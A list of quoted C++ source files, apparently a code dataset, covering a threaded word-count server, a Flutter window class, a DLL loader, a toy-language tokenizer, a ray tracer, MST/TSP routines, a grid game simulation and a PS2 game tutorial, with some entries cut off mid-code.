    "#include \"server.hpp\"\n\nbool cmp(const std::string& lhs, const std::string& rhs)\n{\n    return (std::filesystem::file_size(lhs) > std::filesystem::file_size(rhs));\n}\n\nint main(int argc, char** argv){\n    unsigned int threadNum = 0;\n    if(argc >= 2){\n        threadNum = std::stoi(argv[1]);\n    }else{\n        std::cout<<\"need parameter : number of threads\"<<\"\\n\";\n        exit(1);\n    }\n    #ifdef _DEBUG_\n        std::cout<<\"number of Threds : \"<<threadNum<<\"\\n\";\n    #endif\n \n    // initial thread\n    std::vector<unsigned int> threadWorkload(threadNum);\n    std::vector<std::map<std::string, unsigned int>> dictionaries(threadNum);\n    std::vector<std::vector<std::string>> threadAssignedWork(threadNum);\n/*\n    for(int i = 0; i < threadNum; i++){\n        dictionaries.emplace_back(std::map<std::string, unsigned int>());\n        threadAssignedWork.emplace_back(std::vector<std::string>());\n    }\n*/\n    //receive fileNameList from client\n    auto fileNameList = socket();\n\n    //Larger file is at front\n    std::sort(fileNameList.begin(), fileNameList.end(), cmp);\n\n    // file loading and calculate job loading\n    for(auto fileName : fileNameList){\n        unsigned int min = findMinIndex(threadWorkload);\n        threadWorkload.at(min) += std::filesystem::file_size(fileName);\n        (threadAssignedWork.at(min)).push_back(fileName);\n    }\n\n    /* assigned job to thread and execute+wait*/\n    std::vector<std::thread> threads;\n\n    for(int i = 0; i < threadNum; i++){\n         threads.emplace_back(countJob, std::ref(threadAssignedWork[i]), std::ref(dictionaries[i]));\n    }\n\n    /*wait thread to join main thread*/\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    /* merge output and print*/\n    for(int i = 1; i < threadNum; i++){\n       mergeMaps(dictionaries[0], dictionaries[i]);\n    }\n\n    for(const auto &[x, y] : dictionaries[0]){\n            std::cout<<x<<\" : \"<<y<<\"\\n\";\n    }\n\n\n    return 0;\n}   \n",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "\ufeff#include <iostream>\n#include \"Windows.h\"\n#include <string>\n\nusing namespace std;\n\ntypedef bool (*ContainsAllCharsFunc)(const char*, const char*);\n\nint main() {\n    setlocale(0, \"\");\n    string inputStr;\n    string inputChars;\n\n    HINSTANCE hLib = LoadLibrary(L\"DynamicLib.dll\");\n    if (hLib == NULL) {\n        cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0443!\" << endl;\n        return 1;\n    }\n\n    ContainsAllCharsFunc contains_all_chars = (ContainsAllCharsFunc)GetProcAddress(hLib, \"contains_all_chars\");\n    if (contains_all_chars == NULL) {\n        cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0430\u0434\u0440\u0435\u0441 \u0444\u0443\u043d\u043a\u0446\u0438\u0438!\" << endl;\n        FreeLibrary(hLib);\n        return 1;\n    }\n\n    while (true) {\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 (\u0438\u043b\u0438 \u0432\u0432\u0435\u0434\u0438\u0442\u0435 '0' \u0434\u043b\u044f \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f): \";\n        getline(cin, inputStr);\n\n        if (inputStr == \"0\") {\n            break;\n        }\n\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430: \";\n        getline(cin, inputChars);\n\n        bool result = contains_all_chars(inputStr.c_str(), inputChars.c_str());\n\n        if (result) {\n            cout << \"\u0412\u0441\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043d\u0430\u0439\u0434\u0435\u043d\u044b \u0432 \u0441\u0442\u0440\u043e\u043a\u0435.\" << endl;\n        }\n        else {\n            cout << \"\u041d\u0435 \u0432\u0441\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043d\u0430\u0439\u0434\u0435\u043d\u044b \u0432 \u0441\u0442\u0440\u043e\u043a\u0435.\" << endl;\n        }\n    }\n\n    FreeLibrary(hLib);\n\n    return 0;\n}\n",
    "#include <vector>\n#include <string>\n#include <iostream>\n\n#include <parser/parser.hpp>\n#include <main/file.hpp>\n\nusing std::uint32_t;\nusing HSharpParser::Token;\n\nstd::vector<Token> HSharpParser::Tokenizer::tokenize() {\n    std::string buf = {};\n    std::vector<Token> tokens = {};\n\n    while (peek().has_value()) {\n        if (std::isalpha(peek().value())) {\n            buf.push_back(consume());\n            while (peek().has_value() && std::isalnum(peek().value()))\n                buf.push_back(consume());\n\n            if (buf == \"exit\") {\n                tokens.push_back({.ttype = TokenType::TOK_EXIT});\n                buf.clear();\n            } else if (buf == \"var\") {\n                tokens.push_back({.ttype = TokenType::TOK_VAR});\n                buf.clear();\n            } else if (buf == \"print\") {\n                tokens.push_back({.ttype = TokenType::TOK_PRINT});\n                buf.clear();\n            } else if (buf == \"input\") {\n                tokens.push_back({.ttype = TokenType::TOK_INPUT});\n                buf.clear();\n            } else {\n                tokens.push_back({.ttype = TokenType::TOK_IDENT, .value = buf});\n                buf.clear();\n            }\n        } else if (peek().value() == '\"') {\n            consume();\n            while (peek().has_value() && peek().value() != '\"')\n                buf.push_back(consume());\n            consume();\n            tokens.push_back({.ttype = TokenType::TOK_STR_LIT, .value = buf});\n            buf.clear();\n        } else if (std::isdigit(peek().value())) {\n            buf.push_back(consume());\n            while (peek().has_value() && std::isdigit(peek().value()))\n                buf.push_back(consume());\n            tokens.push_back({.ttype = TokenType::TOK_INT_LIT, .value = buf});\n            buf.clear();\n        } else if (peek().value() == ';') {\n            tokens.push_back({.ttype = TokenType::TOK_SEMICOLON});\n            consume();\n        } else if (peek().value() == '(') {\n            tokens.push_back({.ttype = TokenType::TOK_PAREN_OPEN});\n            consume();\n        } else if (peek().value() == ')') {\n            tokens.push_back({.ttype = TokenType::TOK_PAREN_CLOSE});\n            consume();\n        } else if (peek().value() == '=') {\n            tokens.push_back({.ttype = TokenType::TOK_EQUALITY_SIGN});\n            consume();\n        } else if (peek().value() == '+') {\n            tokens.push_back({.ttype = TokenType::TOK_PLUS});\n            consume();\n        } else if (peek().value() == '-') {\n            tokens.push_back({.ttype = TokenType::TOK_MINUS});\n            consume();\n        } else if (peek().value() == '/') {\n            tokens.push_back({.ttype = TokenType::TOK_FSLASH});\n            consume();\n        } else if (peek().value() == '*') {\n            tokens.push_back({.ttype = TokenType::TOK_MUL_SIGN});\n            consume();\n        } else if (peek().value() == '/' && peek(1).has_value() && peek(1).value() == '/') {\n            consume();\n            consume();\n            while (peek().has_value() && peek().value() != '\\n')\n                consume();\n        } else if (peek().value() == '/' && peek(1).has_value() && peek(1).value() == '*') {\n            consume();\n            consume();\n            while (peek().has_value()) {\n                if (peek().value() == '*' && peek(1).has_value() && peek(1).value() == '/')\n                    break;\n                consume();\n            }\n            if (peek().has_value())\n                consume();\n            if (peek().has_value())\n                consume();\n        } else if (std::isspace(peek().value())) {\n            consume();\n        } else {\n            std::cerr << \"Syntax error!\\n\";\n            exit(1);\n        }\n    }\n\n    index = 0;\n    return tokens;\n}\n",
    "#include <fstream>\n#include <cmath>\n\nstruct Vec3 {\n    double x, y, z;\n    Vec3(double x, double y, double z) : x(x), y(y), z(z) {}\n    Vec3 operator + (const Vec3& v) const { return Vec3(x + v.x, y + v.y, z + v.z); }\n    Vec3 operator - (const Vec3& v) const { return Vec3(x - v.x, y - v.y, z - v.z); }\n    Vec3 operator * (double d) const { return Vec3(x * d, y * d, z * d); }\n    Vec3 operator / (double d) const { return Vec3(x / d, y / d, z / d); }\n    Vec3 normalize() const {\n        double mg = sqrt(x * x + y * y + z * z);\n        return Vec3(x / mg, y / mg, z / mg);\n    }\n};\ninline double dot(const Vec3& a, const Vec3& b) {\n    return (a.x * b.x + a.y * b.y + a.z * b.z);\n}\n\nstruct Ray {\n    Vec3 o, d;\n    Ray(const Vec3& o, const Vec3& d) : o(o), d(d) {}\n};\n\nstruct Sphere {\n    Vec3 c;\n    double r;\n    Sphere(const Vec3& c, double r) : c(c), r(r) {}\n    Vec3 getNormal(const Vec3& pi) const { return (c - pi) / r; }\n    bool intersect(const Ray& ray, double& t) const {\n        const Vec3 o = ray.o;\n        const Vec3 d = ray.d;\n        const Vec3 oc = o - c;\n        const double b = 2 * dot(oc, d);\n        const double c = dot(oc, oc) - r * r;\n        double disc = b * b - 4 * c;\n        if (disc < 1e-4) return false;\n        disc = sqrt(disc);\n        const double t0 = -b - disc;\n        const double t1 = -b + disc;\n        t = (t0 < t1) ? t0 : t1;\n        return true;\n    }\n};\n\nvoid clamp255(Vec3& col) {\n    col.x = (col.x > 255) ? 255 : (col.x < 0) ? 0 : col.x;\n    col.y = (col.y > 255) ? 255 : (col.y < 0) ? 0 : col.y;\n    col.z = (col.z > 255) ? 255 : (col.z < 0) ? 0 : col.z;\n}\n\n\nint main() {\n\n    const int H = 500;\n    const int W = 500;\n\n    const Vec3 white(255, 255, 255);\n    const Vec3 black(0, 0, 0);\n    const Vec3 red(255, 0, 0);\n    const Vec3 blue(0, 0, 255);\n    const Vec3 green(0, 127 / 2, 0);\n\n\n    const Sphere sphere(Vec3(W * 0.5, H * 0.5, 50), 50);\n    const Sphere sphere2(Vec3(W * 1.5, H * 1.5, 50), 30);\n    const Sphere light(Vec3(0, 0, 50), 1);\n\n    std::ofstream out(\"out.ppm\");\n    out << \"P3\\n\" << W << ' ' << H << ' ' << \"255\\n\";\n\n    double t;\n    Vec3 pix_col(black);\n\n    for (int y = 0; y < H; ++y) {\n        for (int x = 0; x < W; ++x) {\n            pix_col = black;\n\n            const Ray ray(Vec3(x, y, 0), Vec3(0, 0, 1));\n            if (sphere.intersect(ray, t)) {\n                const Vec3 pi = ray.o + ray.d * t;\n                const Vec3 L = light.c - pi;\n                const Vec3 N = sphere.getNormal(pi);\n                const double dt = dot(L.normalize(), N.normalize());\n\n                pix_col = (blue + white * dt) * 0.5;\n                clamp255(pix_col);\n            }\n            \n            out << (int)pix_col.x << ' '\n                << (int)pix_col.y << ' '\n                << (int)pix_col.z << '\\n';\n        }\n    }\n}",
    "// Project Identifier: 5949F553E20B650AB0FB2266D3C0822B13D248B0\r\n\r\n#include <getopt.h>\r\n#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <limits>\r\n#include <cmath>\r\n#include <iomanip>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nenum class Loc : uint8_t { Coast, Land, Sea };\r\n\r\nstruct PokemonMST {\r\n    int xCoOrd;\r\n    int yCoOrd;\r\n    Loc loc = Loc::Land;\r\n};\r\n\r\nstruct PokemonTSP {\r\n    int xCoOrd;\r\n    int yCoOrd;\r\n    bool visited = false;\r\n};\r\n\r\nstruct primDatum {\r\n    bool k = false;\r\n    double dSq = numeric_limits<double>::infinity(); // square of the distance\r\n    uint32_t p = 0;\r\n};\r\n\r\nstruct coOrd {\r\n    int x;\r\n    int y;\r\n};\r\n\r\n\r\nclass PlanetAB {\r\nprivate:\r\n    vector<PokemonMST> pokeListMST;\r\n    vector<primDatum> primData;\r\n    vector<PokemonTSP> pokeListTSP;\r\n    uint32_t totVertex;\r\n\r\n    void inputMST() {\r\n        pokeListMST.reserve(totVertex);\r\n        primData.resize(totVertex);\r\n        int inputX;\r\n        int inputY;\r\n        Loc inputLoc;\r\n        PokemonMST pokemon;\r\n        while (cin >> inputX >> inputY) {\r\n            if (inputX > 0 || inputY > 0) {\r\n                inputLoc = Loc::Land;\r\n            }\r\n            else if (inputX == 0 || inputY == 0) {\r\n                inputLoc = Loc::Coast;\r\n            }\r\n            else {\r\n                inputLoc = Loc::Sea;\r\n            }\r\n\r\n            pokemon = { inputX, inputY, inputLoc };\r\n            pokeListMST.push_back(pokemon);\r\n\r\n        }\r\n    }\r\n\r\n    void inputTSP() {\r\n        pokeListTSP.reserve(totVertex);\r\n        //primData.resize(totVertex);\r\n        int inputX;\r\n        int inputY;\r\n        PokemonTSP pokemon;\r\n        while (cin >> inputX >> inputY) {\r\n\r\n            pokemon = { inputX, inputY, false };\r\n            pokeListTSP.push_back(pokemon);\r\n\r\n        }\r\n    }\r\n\r\n    double distanceSqMST(uint32_t indexFrom, uint32_t indexTo) {\r\n        double xdiff = numeric_limits<double>::infinity();\r\n        double ydiff = numeric_limits<double>::infinity();\r\n\r\n        if ((pokeListMST[indexFrom].loc == Loc::Land && pokeListMST[indexTo].loc == Loc::Sea)\r\n            || (pokeListMST[indexFrom].loc == Loc::Sea && pokeListMST[indexTo].loc == Loc::Land)) {\r\n\r\n        }\r\n        else {\r\n            xdiff = pokeListMST[indexFrom].xCoOrd - pokeListMST[indexTo].xCoOrd;\r\n            ydiff = pokeListMST[indexFrom].yCoOrd - pokeListMST[indexTo].yCoOrd;\r\n        }\r\n\r\n        return (xdiff * xdiff) + (ydiff * ydiff);\r\n    }\r\n\r\n    double distanceTSP(uint32_t indexFrom, uint32_t indexTo) {\r\n        double xdiff = pokeListTSP[indexFrom].xCoOrd - pokeListTSP[indexTo].xCoOrd;\r\n        double ydiff = pokeListTSP[indexFrom].yCoOrd - pokeListTSP[indexTo].yCoOrd;\r\n\r\n        return sqrt((xdiff * xdiff) + (ydiff * ydiff));\r\n    }\r\n\r\n    double distanceSqTSP(uint32_t indexFrom, uint32_t indexTo) {\r\n        double xdiff = pokeListTSP[indexFrom].xCoOrd - pokeListTSP[indexTo].xCoOrd;\r\n        double ydiff = pokeListTSP[indexFrom].yCoOrd - pokeListTSP[indexTo].yCoOrd;\r\n\r\n        return (xdiff * xdiff) + (ydiff * ydiff);\r\n    }\r\n\r\n    double primAlg() {\r\n        primData[0].dSq = 0;\r\n        double totWeight = 0;\r\n        for (uint32_t i = 0; i < totVertex; ++i) {\r\n            uint32_t curInd = 0;\r\n            double curDis = numeric_limits<double>::infinity();\r\n            for (uint32_t j = 0; j < totVertex; ++j) {\r\n                if (primData[j].k == false) {\r\n                    if (primData[j].dSq < curDis) {\r\n                        curDis = primData[j].dSq;\r\n                        curInd = j;\r\n                    }\r\n                }\r\n            }\r\n            primData[curInd].k = true;\r\n            totWeight += sqrt(primData[curInd].dSq);\r\n\r\n            for (uint32_t j = 0; j < totVertex; ++j) {\r\n                if (primData[j].k == false) {\r\n                    double dSqNew = distanceSqMST(curInd, j);\r\n                    if (dSqNew < primData[j].dSq) {\r\n                        primData[j].dSq = dSqNew;\r\n                        primData[j].p = curInd;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return totWeight;\r\n    }\r\n\r\n    double nNeighborHeu(vector<uint32_t>& travelList) {\r\n\r\n        uint32_t minInd = 0;\r\n        uint32_t curInd = 0;\r\n        double totWeight = 0;\r\n        double curWeight = 0;\r\n        pokeListTSP[curInd].visited = true;\r\n        travelList.push_back(0);\r\n\r\n        for (uint32_t i = 0; i < pokeListTSP.size() - 1; ++i) {\r\n            double prevDis = numeric_limits<double>::infinity();\r\n            double curDis = 0.0;\r\n            for (uint32_t j = 0; j < pokeListTSP.size(); ++j) {\r\n                if (pokeListTSP[j].visited == false) {\r\n                    curDis = distanceSqTSP(curInd, j);\r\n                    if (curDis < prevDis) {\r\n                        prevDis = curDis;\r\n                        minInd = j;\r\n                        curWeight = curDis;\r\n                    }\r\n                }\r\n            }\r\n            pokeListTSP[minInd].visited = true;\r\n  ",
    "#include <iostream>\n#include <vector>\n#include <cstring>\n#include <algorithm>\nusing namespace std;\n\nint N, M, K;\n\nint Map[21][21];\nint Lab[21][21];\nint Visit[21][21];\n\nint dx[4] = { 1, -1, 0, 0 };\nint dy[4] = { 0, 0, 1, -1 };\n\nstruct Block {\n    int x;\n    int y;\n};\n\nvector<Block> Team[6];\nint Person[6];\nint Point[6];\n\nvoid Input() {\n    cin >> N >> M >> K;\n    for (int i = 1; i <= N; i++)\n        for (int j = 1; j <= N; j++)\n            cin >> Map[i][j];\n}\n\n//\ud300 \uad6c\uc5ed \ud0d0\uc0c9 : \uba38\ub9ac -> \uaf2c\ub9ac \ubc29\ud5a5\nvoid Label(int x, int y, int L) {\n    for (int i = 0; i < 4; i++)\n    {\n        int nx = x + dx[i];\n        int ny = y + dy[i];\n        if (nx < 1 || ny < 1 || nx > N || ny > N) continue;\n        if (Visit[nx][ny] == 1 || Map[nx][ny] == 0) continue;\n\n        //\uac00\uc7a5 \ucc98\uc74c \ud0d0\uc0c9\ud560 \ub54c \ubb34\uc870\uac74 2\uac00 \uc788\ub294 \ubc29\ud5a5\uc73c\ub85c DFS \uc9c4\ud589\ud55c\ub2e4.\n        //Vector.size() \ub97c \ud65c\uc6a9\n        //\uc790\uc5f0\uc2a4\ub7fd\uac8c \uba38\ub9ac -> \uaf2c\ub9ac \ubc29\ud5a5\uc73c\ub85c Vector\uc5d0 \uc0bd\uc785\ub41c\ub2e4.\n        if(Team[L].size() == 1 && Map[nx][ny] != 2) continue;\n\n        //\uaf2c\ub9ac\uac00 \ub098\uc624\ub294 \uacf3\uae4c\uc9c0 \ud0d0\uc0c9\ud558\uba74 \ud604\uc7ac\uae4c\uc9c0\uc758 Vector.size()\uac00 \uc778\uad6c\n        if(Map[nx][ny] == 3) Person[L] = Team[L].size() + 1;\n\n        Visit[nx][ny] = 1;\n        Team[L].push_back({ nx, ny });\n        Label(nx, ny, L);\n    }\n}\n\n//\ud300 \uc0dd\uc131\nvoid Make_Team() {\n    int L = 1;\n    for (int i = 1; i <= N; i++)\n        for (int j = 1; j <= N; j++)\n        {\n            if (Map[i][j] == 1 && Visit[i][j] == 0)\n            {\n                Visit[i][j] = 1;\n                Team[L].push_back({ i, j });\n                Label(i, j, L);\n                L++;\n            }\n        }\n\n    for (int i = 1; i < L; i++)\n    {\n        for (int j = 0; j < Team[i].size(); j++)\n        {\n            Lab[Team[i][j].x][Team[i][j].y] = i;\n        }\n    }\n    memset(Visit, 0, sizeof(Visit));\n}\n\n//\ud300 \ud68c\uc804\nvoid Rotation() {\n    for (int n = 1; n <= M; n++)\n    {\n        int sz = Team[n].size();\n        int tx = Team[n][sz - 1].x;\n        int ty = Team[n][sz - 1].y;\n\n        for (int i = sz - 1; i >= 1; i--)\n        {\n            Team[n][i].x = Team[n][i - 1].x;\n            Team[n][i].y = Team[n][i - 1].y;\n        }\n        Team[n][0].x = tx;\n        Team[n][0].y = ty;\n\n        //Map \ub3d9\uae30\ud654\n        for (int i = 0; i < Team[n].size(); i++)\n        {\n            if(i == 0) \n                Map[Team[n][i].x][Team[n][i].y] = 1;\n            else if(i > 0 && i < Person[n] - 1) \n                Map[Team[n][i].x][Team[n][i].y] = 2;\n            else if(i == Person[n] - 1) \n                Map[Team[n][i].x][Team[n][i].y] = 3;\n            else \n                Map[Team[n][i].x][Team[n][i].y] = 4;\n        }\n\n    }\n}\n\n\nvoid State(int L, int x, int y) {\n\n    for (int i = 0; i < Team[L].size(); i++)\n    {\n        if (Team[L][i].x == x && Team[L][i].y == y)\n        {\n            Point[L] += (i + 1) * (i + 1);\n        }\n    }\n\n    reverse(Team[L].begin(), Team[L].begin() + Person[L]);\n    reverse(Team[L].begin() + Person[L], Team[L].end());\n    //\uc88c\ud45c \uc5ed\uc21c \n    for(int i = 0; i < Team[L].size(); i++)\n    {\n        if(i == 0) \n            Map[Team[L][i].x][Team[L][i].y] = 1;\n        else if(i > 0 && i < Person[L] - 1) \n            Map[Team[L][i].x][Team[L][i].y] = 2;\n        else if(i == Person[L] - 1) \n            Map[Team[L][i].x][Team[L][i].y] = 3;\n        else \n            Map[Team[L][i].x][Team[L][i].y] = 4;\n    }\n}\n\nvoid Ball(int Round) {\n\n    int R = Round % (4 * N);\n    if (R >= 1 && R <= N)\n    {\n        for (int i = 1; i <= N; i++)\n        {\n            if (Map[R][i] == 0 || Map[R][i] == 4) continue;\n            State(Lab[R][i], R, i);\n            break;\n        }\n    }\n    \n    if (R > N && R <= 2 * N)\n    {\n        for (int i = N; i >= 1; i--)\n        {\n            if (Map[i][R - N] == 0 || Map[i][R - N] == 4) continue;\n            \n            State(Lab[i][R - N], i, R - N);\n            break;\n        }\n    }\n    \n    if (R > 2 * N && R <= 3 * N)\n    {\n        for (int i = N; i >= 1; i--)\n        {\n            if (Map[3 * N - R + 1][i] == 0 || Map[3 * N - R + 1][i] == 4) continue;\n            State(Lab[3 * N - R + 1][i], 3 * N - R + 1, i);\n            break;\n        }\n    }\n    \n    if(R > 3 * N)\n    {\n        for (int i = 1; i <= N; i++)\n        {\n            if (Map[i][4 * N - R + 1] == 0 || Map[i][4 * N - R + 1] == 4) continue;\n            State(Lab[i][4 * N - R + 1], i, 4 * N - R + 1);\n            break;\n        }\n    }\n    \n    if(R == 0)\n    {\n        for (int i = 1; i <= N; i++)\n        {\n            if (Map[i][1] == 0 || Map[i][1] == 4) continue;\n            State(Lab[i][1], i, 1);\n            break;\n        }\n    }\n}\n\nint Make_Ans() {\n    int sum = 0;\n    for (int i = 1; i <= M; i++)\n    {\n        sum += Point[i];\n    }\n    return sum;\n}\n\nint main() {\n    Input();\n    Make_Team();\n\n    int Time = 1;\n    while (Time <= K)\n    {\n        Rotation();\n        Ball(Time);\n        Time++;\n    }\n    cout << Make_Ans() << endl;\n}",
    "/*\r\n# _____        ____   ___\r\n#   |     \\/   ____| |___|\r\n#   |     |   |   \\  |   |\r\n#-----------------------------------------------------------------------\r\n# Copyright 2022, tyra - https://github.com/h4570/tyra\r\n# Licensed under Apache License 2.0\r\n# Sandro Sobczy\u0144ski <sandro.sobczynski@gmail.com>\r\n*/\r\n\r\n#include <tyra>\r\n#include \"tutorial_02.hpp\"\r\n\r\nnamespace Tyra {\r\n\r\nTutorial02::Tutorial02(Engine* t_engine) : engine(t_engine) {\r\n  pad = &engine->pad;\r\n}\r\n\r\nTutorial02::~Tutorial02() {\r\n  engine->renderer.getTextureRepository().freeBySprite(sprite);\r\n}\r\n\r\nvoid Tutorial02::init() {\r\n  engine->renderer.setClearScreenColor(Color(32.0F, 32.0F, 32.0F));\r\n  cubeX = 0;\r\n  cubeY = 100;\r\n\r\n  cube2X = 300;\r\n  cube2Y = 100;\r\n\r\n  bulletShooted = false;\r\n  whoShooted = 0;\r\n\r\n  player1Health = 5;\r\n  player2Heath = 5;\r\n\r\n  /** Sprite contains rectangle information. */\r\n  loadSprite();\r\n  loadSprite2();\r\n\r\n  loadBgSprite();\r\n  loadBulletSprite();\r\n\r\n  loadHud1Sprite();\r\n  loadHud2Sprite();\r\n  loadHealthBar1Sprite();\r\n  loadHealthBar2Sprite();\r\n\r\n  loadWin1Sprite();\r\n  loadWin2Sprite();\r\n\r\n  /** Texture contains png image. */\r\n  loadTexture();\r\n  loadBgTexture();\r\n\r\n  loadTexture2();\r\n\r\n  loadBulletTexture();\r\n\r\n  loadHud1Texture();\r\n  loadHud2Texture();\r\n\r\n  loadHealthBar1Texture();\r\n  loadHealthBar2Texture();\r\n  \r\n  loadWin1Texture();\r\n  loadWin2Texture();\r\n}\r\n\r\nvoid Tutorial02::loop() {\r\n  auto& renderer = engine->renderer;\r\n\r\n  sprite2.position=Vec2(cubeX,cubeY);\r\n  sprite.position =Vec2(cube2X,cube2Y);\r\n  bullet.position =Vec2(bullet.position.x += bulletSpeed.x,bullet.position.y += bulletSpeed.y);\r\n  bulletX = bullet.position.x;\r\n  bulletY = bullet.position.y;\r\n\r\n  if(pad->getLeftJoyPad().h <= 100 && cubeX > 0){\r\n    cubeX -= PlayerSpeed;\r\n    player1Dir = 3;\r\n  }\r\n\r\n  if(pad->getLeftJoyPad().h >= 200 && cubeX < engine->renderer.core.getSettings().getWidth() - 32.0f){\r\n    cubeX += PlayerSpeed;\r\n    player1Dir = 2;\r\n  }\r\n\r\n  if(pad->getLeftJoyPad().v <= 100 && cubeY > 0){\r\n    cubeY -= PlayerSpeed;\r\n    player1Dir = 1;\r\n  }\r\n\r\n  if(pad->getLeftJoyPad().v >= 200 && cubeY < engine->renderer.core.getSettings().getHeight() - 32.0f){\r\n    cubeY += PlayerSpeed;\r\n    player1Dir = 0;\r\n  }\r\n\r\n  //Player 2 movement\r\n\r\n  if(pad->getRightJoyPad().h <= 100 && cube2X > 0){\r\n    cube2X -= PlayerSpeed;\r\n    player2Dir = 3;\r\n  }\r\n\r\n  if(pad->getRightJoyPad().h >= 200 && cube2X < engine->renderer.core.getSettings().getWidth() - 32.0f){\r\n    cube2X += PlayerSpeed;\r\n    player2Dir = 2;\r\n  }\r\n\r\n  if(pad->getRightJoyPad().v <= 100 && cube2Y > 0){\r\n    cube2Y -= PlayerSpeed;\r\n    player2Dir = 1;\r\n  }\r\n\r\n  if(pad->getRightJoyPad().v >= 200 && cube2Y < engine->renderer.core.getSettings().getHeight() - 32.0f){\r\n    cube2Y += PlayerSpeed;\r\n    player2Dir = 0;\r\n  }\r\n\r\n  //Shoot\r\n  if(bulletX < 0){\r\n    resetBullet();\r\n  }\r\n  if(bulletY < 0){\r\n    resetBullet();\r\n  }\r\n  if(bulletX > engine->renderer.core.getSettings().getWidth()){\r\n    resetBullet();\r\n  }\r\n  if(bulletY > engine->renderer.core.getSettings().getHeight()){\r\n    resetBullet();\r\n  }\r\n\r\n  //Collisions...\r\n  switch (whoShooted)\r\n  {\r\n    case 1:\r\n      if(checkCollisionBoxBox(Vec2(bulletX,bulletY),bullet.size,Vec2(cube2X,cube2Y),sprite2.size)){\r\n        resetBullet();\r\n        player2Heath -= 1;\r\n        bar2.size.x -= 22.4f;\r\n      }\r\n      break;\r\n    case 2:\r\n      if(checkCollisionBoxBox(Vec2(bulletX,bulletY),bullet.size,Vec2(cubeX,cubeY),sprite.size)){\r\n        resetBullet();\r\n        player1Health -= 1;\r\n        bar1.size.x -= 22.4f;\r\n      }\r\n      break;\r\n\r\n    default:\r\n      break;\r\n  }\r\n\r\n  if(player1Health <= 0){\r\n    whoWin = 2;\r\n    player1Health = 0;\r\n  }\r\n  if(player2Heath <= 0){\r\n    whoWin = 1;\r\n    player2Heath = 0;\r\n  }\r\n\r\n  if(pad->getPressed().L2){\r\n    if(!bulletShooted){\r\n      switch (player1Dir)\r\n      {\r\n      case 0:\r\n          whoShooted = 1;\r\n          bulletSpeed = Vec2(0,2.5f);\r\n          bulletShooted = true;\r\n          bullet.position.x = cubeX;\r\n          bullet.position.y = cubeY;\r\n          break;\r\n      case 1:\r\n          whoShooted = 1;\r\n          bulletSpeed = Vec2(0,-2.5f);\r\n          bulletShooted = true;\r\n          bullet.position.x = cubeX;\r\n          bullet.position.y = cubeY;\r\n          break;\r\n      case 2:\r\n        whoShooted = 1;\r\n        bulletSpeed = Vec2(2.5f,0);\r\n        bulletShooted = true;\r\n        bullet.position.x = cubeX;\r\n        bullet.position.y = cubeY;\r\n        break;\r\n      case 3:\r\n        whoShooted = 1;\r\n        bulletSpeed = Vec2(-2.5f,0);\r\n        bulletShooted = true;\r\n        bullet.position.x = cubeX;\r\n        bullet.position.y = cubeY;\r\n        break;\r\n      \r\n      default:\r\n        break;\r\n      }\r\n    }\r\n  }\r\n  if(pad->getPressed().R2){\r\n    if(!bulletShooted){\r\n      switch (player2Dir)\r\n      {\r\n      case 0:\r\n          whoShooted = 2;\r\n          bulletSpeed = Vec2(0,2.5f);\r\n          bulletShooted = true;\r\n          bullet.position.x = cube2X;\r\n          bullet.position.y = cube2Y;\r\n          break;\r\n  ",
